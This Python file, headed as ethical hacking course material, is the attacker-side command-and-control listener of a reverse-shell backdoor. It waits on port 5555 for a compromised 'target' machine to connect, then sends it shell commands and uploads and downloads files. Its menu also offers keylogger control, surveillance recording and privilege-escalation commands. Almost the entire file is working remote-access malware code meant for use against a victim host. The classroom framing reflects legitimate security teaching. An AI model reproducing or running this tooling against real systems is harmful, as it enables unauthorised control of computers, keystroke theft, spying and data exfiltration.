################################################
# Author: Watthanasak Jeamwatthanachai, PhD    #
# Class: SIIT Ethical Hacking, 2023-2024       #
################################################

# Import necessary libraries
import socket  # This library is used for creating socket connections.
import json  # JSON is used for encoding and decoding data in a structured format.
import os  # This library allows interaction with the operating system.


# Function to send data reliably as JSON-encoded strings
def reliable_send(data):
    # Convert the input data into a JSON-encoded string.
    jsondata = json.dumps(data)
    # Send the JSON-encoded data over the network connection after encoding it as bytes.
    target.send(jsondata.encode())


# Function to receive data reliably as JSON-decoded strings
def reliable_recv():
    data = ''
    while True:
        try:
            # Receive data from the target (up to 1024 bytes), decode it from bytes to a string,
            # and remove any trailing whitespace characters.
            data = data + target.recv(1024).decode().rstrip()
            # Parse the received data as a JSON-decoded object.
            return json.loads(data)
        except ValueError:
            continue


# Function to upload a file to the target machine
def upload_file(file_name):
    # Open the specified file in binary read ('rb') mode.
    f = open(file_name, 'rb')
    # Read the contents of the file and send them over the network connection to the target.
    target.send(f.read())
    # Close the file after uploading is complete.
    f.close()


# Function to download a file from the target machine
def download_file(file_name):
    # Open the specified file in binary write ('wb') mode.
    f = open(file_name, 'wb')
    # Set a timeout for receiving data from the target (1 second).
    target.settimeout(1)
    chunk = target.recv(1024)
    while chunk:
        # Write the received data (chunk) to the local file.
        f.write(chunk)
        try:
            # Attempt to receive another chunk of data from the target.
            chunk = target.recv(1024)
        except socket.timeout as e:
            break
    # Reset the timeout to its default value (None).
    target.settimeout(None)
    # Close the local file after downloading is complete.
    f.close()


# Function for the main communication loop with the target
def target_communication():
    print("BASIC COMMANDS:")
    print("   whoami, dir, ipconfig, pwd, ps, net user")
    print("   cd <path>              - Change directory")
    print("")
    print("KEYLOGGER COMMANDS:")
    print("   start_keylog           - Start keylogger")
    print("   stop_keylog            - Stop keylogger")
    print("   get_keylog             - Retrieve logged keys")
    print("")
    print("[NOT WORKING] RECORDING COMMANDS:")
    print("   screenshot             - Take screenshot")
    print("   start_recording        - Start audio/video surveillance")
    print("   stop_recording         - Stop surveillance")
    print("   list_recordings        - List recorded files")
    print("")
    print("PRIVILEGE ESCALATION:")
    print("   check_privs            - Check current privileges")
    print("   escalate               - Attempt privilege escalation")
    print("   privesc_report         - Generate privilege report")
    print("")
    print("FILE OPERATIONS:")
    print("   upload <filename>      - Upload file to target")
    print("   download <filename>    - Download file from target")
    print("")
    print(f"Connected to target: {ip[0]}:{ip[1]}")
    
    while True:
        # Prompt the user for a command to send to the target.
        command = input('* Shell~%s: ' % str(ip))
        
        # Handle empty commands
        if not command:
            continue
            
        # Handle help command locally
        if command == 'help':
            target_communication()
            break
            
        # Send the user's command to the target using the reliable_send function.
        reliable_send(command)
        
        if command.startswith('cd '):
            # Handle directory change
            result = reliable_recv()
            print(result)
        elif command.startswith('download '):
            # If the user enters 'download', initiate the download of a file from the target.
            filename = command[9:].strip()
            download_file(filename)
        elif command.startswith('upload '):
            # If the user enters 'upload', initiate the upload of a file to the target.
            filename = command[7:].strip()
            if filename and os.path.exists(filename):
                upload_file(filename)
                result = reliable_recv()
                print(result)
            elif not filename:
                print("Please specify a filename to upload")
            else:
                print(f"File not found: {filename}")
        elif command in ['start_keylog', 'stop_keylog', 'get_keylog']:
            # Handle keylogger commands
            result = reliable_recv()
            if command == 'start_keylog':
                print(f"Keylogger: {result}")
            elif command == 'stop_keylog':
                print(f"Keylogger: {result}")
            elif command == 'get_keylog':
                print(f"Keylog Data:\n{'-'*40}")
                print(result)
                print("-"*40)
        elif command in ['screenshot', 'start_recording', 'stop_recording', 'list_recordings']:
            # Handle recording commands
            result = reliable_recv()
            if command == 'screenshot':
                print(f"Screenshot: {result}")
            elif command == 'start_recording':
                print(f"Recording: {result}")
            elif command == 'stop_recording':
                print(f"Recording: {result}")
            elif command == 'list_recordings':
                print(f"Recordings:\n{result}")
        elif command in ['check_privs', 'escalate', 'privesc_report']:
            # Handle privilege escalation commands
            result = reliable_recv()
            if command == 'check_privs':
                print(f"Privileges: {result}")
            elif command == 'escalate':
                print(f"Escalation Result:\n{'-'*40}")
                print(result)
                print("-"*40)
            elif command == 'privesc_report':
                print(f"Privilege Report:\n{'-'*40}")
                print(result)
                print("-"*40)
        else:
            # For other commands, receive and print the result from the target.
            result = reliable_recv()
            print(f"Output:\n{result}")



# Create a socket for the server
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Allow socket reuse to prevent "Address already in use" error
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

# Bind the socket to listen on all interfaces and port 5555
# CHANGE IP TO YOUR KALI LINUX IP OR USE 0.0.0.0 to listen on all interfaces
sock.bind(('0.0.0.0', 5555))  # Listen on all interfaces

# Start listening for incoming connections (maximum 5 concurrent connections).
print('[+] Listening For The Incoming Connections on port 5555')
sock.listen(5)

# Accept incoming connection from the target and obtain the target's IP address.
target, ip = sock.accept()
print('[+] Target Connected From: ' + str(ip))

# Start the main communication loop with the target by calling target_communication.
target_communication()
